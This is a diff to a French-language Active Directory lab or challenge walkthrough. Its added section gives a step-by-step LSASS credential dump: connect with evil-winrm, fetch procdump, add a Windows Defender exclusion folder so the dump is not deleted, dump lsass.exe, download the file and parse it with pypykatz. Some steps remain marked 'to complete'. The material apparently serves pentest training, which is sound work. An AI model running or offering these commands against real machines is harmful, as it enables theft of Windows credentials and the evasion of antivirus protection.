@@ -307,21 +307,57 @@ Votre mission pour ce niveau consiste donc à utiliser votre compte admin pour d
 
 Attaque : 
 
-scp ProcDump.exe mimikatz.exe ocean-admin@MGM-SRV:C:\temp\
+La première étape consiste donc à se connecter sur la machine cliente cible 
 
-Enter-PSSession -ComputerName MGM-SRV -Credential MGM\ocean-admin
+```shell
+    evil-winrm -i IP_X.X.X.X -u "$USER" -p "$PASSWOR"
+```
+L'attaquant doit ensuite checker les utilisateurs qui sont actuellement connectés sur la machine cible
 
-cd C:\temp
+```shell
+    to complete
+```
 
-.\ProcDump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
+Ayant obtenu des droits admin Local à l'étape précédente il peut maintenant installer des applications et les lancer.
+On va donc installer l'outil procdump fourni par microsoft afin d'extraire le contenu du LSASS de la mémoire.
 
-Exit-PSSession
+Commande pour installer procdump
+```shell
+    invoke-webrequest https://download.sysinternals.com/files/Procdump.zip -OutFile "your_output"
+```
 
-scp ocean-admin@MGM-SRV:C:\temp\lsass.dmp /path/to/local/
+ensuite l'extraire 
+```Powershell
+    tocomplete
+```
 
-```powershell
-exegol-adpentest /workspace # pypykatz lsa minidump "ssss.dmp" --json
+puis l'installer en tant que debogger par défaut pour qu'il se lance sans problème même à travers une connexion distante et accepter les conditions d'utilisation.
 
+```Powershell
+    .\procdump.exe -accepteula -i
+```
+
+après l'installation il reste un problème de taille : l'ANTI VIRUS qui detecte l'extraction du LSASS dans un fichier .dmp et le supprime en emettant l'alerte "Trojan:Win32/LsassDump.B" pour éviter cela nous allons exclure le dossier où va être sauvegarder le fichier .dmp, c'est à dire empecher l'antivirus de scanner ce dossier .
+
+La commande est la suivante : 
+```Powershell
+    Add-MpPreference -ExclusionPath "C:/Users/lala/Downloads/"
+```
+Ensuite nous allons procéder à l'extraction du LSASS.
+
+```Powershell
+    .\procdump.exe lsass.exe -ma "C:/Users/lala/Downloads/"
+```
+Grâce à notre session Evil-Winrm on va pouvoir télécharger sur notre machine attaquante le fichier .dmp
+
+```Powershell
+    download "C:/Users/lala/Downloads/lsass.exe_250605_024441.dmp"
+```
+Nous avons donc le contenu du LSASS sur notre machine attaquante on va donc extraire le contenu.
+La commande pour extraire le contenu du LSASS (.dmp) et l'afficher dans un format JSON est la suivante :
+
+```shell
+    pypykatz lsa minidump "your_lsass_file.dmp" --json
 ```
 
 
